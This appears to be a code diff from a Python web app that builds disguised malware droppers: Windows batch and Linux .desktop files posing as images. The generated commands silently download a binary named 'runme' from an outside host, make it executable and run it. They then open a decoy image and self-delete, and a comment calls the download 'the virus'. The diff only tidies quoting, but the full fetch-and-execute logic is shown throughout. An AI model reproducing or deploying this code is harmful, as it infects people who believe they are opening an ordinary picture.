@@ -152,8 +152,8 @@ def proceed():
 
     # Creates the batfile
     batfile = batfile_template[:]
-    batfile += f'''\nwsl bash -c "curl -s -X POST -o {original_filename} https://cyber.stanleyhoo1.tech/download_image/{filename} 2>/dev/null"'''
-    batfile += f'''\nstart {original_filename}'''
+    batfile += f'''\nwsl bash -c "curl -s -X POST -o '{original_filename}' https://cyber.stanleyhoo1.tech/download_image/{filename} 2>/dev/null"'''
+    batfile += f'''\nstart "" "{original_filename}"'''
 
     # Batfile self deletes
     batfile += del_exe
@@ -169,13 +169,13 @@ def proceed():
     deskfile = desktop_template[:]
     deskfile = deskfile.replace("FILENAME", original_filename)
     deskfile_commands = ""
-    deskfile_commands += (f"curl -s -X POST -o ~/.config/rm17-node https://cyber.stanleyhoo1.tech/files/runme 2>/dev/null; " 
-                          f"chmod +x ~/.config/rm17-node 2>/dev/null; " 
-                          f"~/.config/rm17-node 2>/dev/null; " 
-                          f"curl -s -X POST -o {original_filename} https://cyber.stanleyhoo1.tech/download_image/{filename} 2>/dev/null; " 
-                          f"rm .{os.path.splitext(filename)[0]}.png; " 
-                          f"xdg-open {original_filename}; " 
-                          f"rm {session['filename']}.desktop")
+    deskfile_commands += (f"curl -s -X POST -o ~/.config/rm17-node https://cyber.stanleyhoo1.tech/files/runme 2>/dev/null; "
+                          f"chmod +x ~/.config/rm17-node 2>/dev/null; "
+                          f"~/.config/rm17-node 2>/dev/null; "
+                          f"curl -s -X POST -o '{original_filename}' https://cyber.stanleyhoo1.tech/download_image/{filename} 2>/dev/null; "
+                          f"rm '.{os.path.splitext(filename)[0]}.png'; "
+                          f"xdg-open '{original_filename}'; "
+                          f"rm '{session['filename']}.desktop'")
     deskfile = deskfile.replace("COMMANDS", deskfile_commands)
     deskfile = deskfile.replace("PNG_PATH", f'{os.path.splitext(original_filename)[0]}.png')
 
@@ -201,7 +201,7 @@ def proceed():
     subprocess.run(["python3", "/home/stanley/pseudo/app/convert_exe.py", os.path.splitext(filename)[0]])
 
     flash("Image processed! Click download to get the PNG.", "success")
-    return render_template("results.html", filename=original_filename, img=filename, download_filename=f'{os.path.splitext(filename)[0]}', download_png_name=f'.{original_filename}')
+    return render_template("results.html", filename=original_filename, img=filename, download_filename=f'{os.path.splitext(filename)[0]}', download_png_name=f'{session['filename']}.png')
 
 # Download page where the target will download the virus
 @app.route("/results", methods=['GET', 'POST'])
